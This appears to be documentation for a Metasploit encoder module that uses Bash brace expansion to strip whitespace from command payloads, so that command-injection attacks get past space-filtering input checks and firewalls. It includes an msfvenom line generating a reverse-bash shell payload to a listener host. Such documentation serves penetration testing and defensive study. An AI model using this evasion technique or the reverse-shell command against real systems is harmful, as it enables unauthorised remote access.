# Bash Brace Expansion Command Encoder

## Module Overview

This encoder leverages Bash's brace expansion feature to avoid using whitespace characters in command payloads. It is useful in situations where whitespace is filtered or restricted, such as in certain command injection vulnerabilities or web application firewalls. By replacing spaces with commas inside curly braces, the command can often bypass filters that look for classic space-separated commands.

The encoder wraps the original command in curly braces (`{}`), replacing every whitespace (space, tab, etc.) with a comma. When interpreted by Bash or compatible shells, this causes the shell to expand the braces and execute the command as if the spaces were present.

**Note:** Minimal escaping is performed, so results may be incorrect for commands that include brace-related meta-characters.

## Options

This encoder does not have user-configurable options.

## Usage Example

To use this encoder with Metasploit's msfvenom for a simple payload:

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=10.0.0.1 LPORT=4444 -e cmd/brace
```

Or, within Metasploit:

```
set ENCODER cmd/brace
```

## Scenarios

- Circumventing filters that block whitespace but allow other shell meta-characters
- Exploiting web applications or network devices with command injection vulnerabilities that restrict the use of space characters
- Useful in environments where Bash (or a compatible shell) interprets the payload

## Caveats

- The encoder may produce incorrect code if the input command contains characters like `{`, `,`, or `}` that are not properly escaped.
- Only effective on targets with Bash or a shell supporting brace expansion.
- Rank is set to Low due to the potential for incorrect expansion.

## References

- [Bash Brace Expansion - GNU Bash Manual](https://www.gnu.org/software/bash/manual/bash.html#Brace-Expansion)
